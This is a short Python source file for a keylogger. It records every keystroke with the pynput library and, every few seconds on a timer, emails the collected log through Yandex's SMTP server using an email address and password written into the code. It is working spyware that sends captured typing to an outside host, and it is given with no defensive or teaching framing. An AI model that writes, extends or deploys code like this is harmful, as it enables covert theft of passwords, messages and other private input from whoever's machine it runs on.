#!/usr/bin/env python

from pynput import keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval=5, email="jurikolo@yandex.com", password="12345678"):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = f" {str(key)} "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(interval=self.interval, function=self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.yandex.ru",
                              port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(from_addr=email,
                        to_addrs=email,
                        msg=message)
        server.quit()

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
